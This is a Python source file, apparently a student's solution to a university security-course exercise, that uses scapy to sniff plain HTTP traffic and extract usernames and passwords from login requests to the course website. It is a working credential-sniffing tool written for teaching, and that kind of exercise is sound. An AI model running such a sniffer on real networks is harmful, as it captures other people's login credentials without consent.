import scapy.all as S
import urlparse
from mimetools import Message
from StringIO import StringIO

WEBSITE = 'infosec.cs.tau.ac.il'


def parse_packet(packet):
    """
    If the given packet is a login request to the course website, return the
    username and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.
    
    Notes:
    1. You can assume the entire HTTP request fits within one packet, and that
       both the username and password are non-empty for login requests (if any
       of the above assumptions fails, it's OK if you don't extract the
       user/password - but you must still NOT crash).
    2. Filter the course website using the `WEBSITE` constant from above. DO NOT
       use the server IP for the filtering (as our domain may point to different
       IPs later and your code should be reliable).
    3. Make sure you return a tuple, not a list.
    """
    try:
    	request_line, headers_alone = str(packet.load).split('\r\n', 1) #parse http request, found on stack overflow
    	headers = Message(StringIO(headers_alone)) #split request header into fields
    	if headers['Host']!=WEBSITE: # or headers['content-type']!='application/x-www-form-urlencoded'): #verify this is our website and a form is sent
            return None
        o = urlparse.parse_qsl((packet[S.Raw].load)) #splits the packet into tuples, tupple 0 will contain all headers, 
        if o[1][0]=='username' and o[2][0]=='password':
        	return (o[1][1],o[2][1]) #place of username and password in split url
        return None
    except:
        return None

def packet_filter(packet):
    """
    Filter to keep only HTTP traffic (port 80) from any HTTP client to any
    HTTP server (not just the course website). This function should return
    `True` for packets that match the above rule, and `False` for all other
    packets.

    Notes:
    1. We are only keeping HTTP, while dropping HTTPS
    2. Traffic from the server back to the client should not be kept
    """
    try:
        if ((S.TCP in packet) and (packet[S.TCP].dport == 80)):
            return True
        return False
    except:
        return False


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
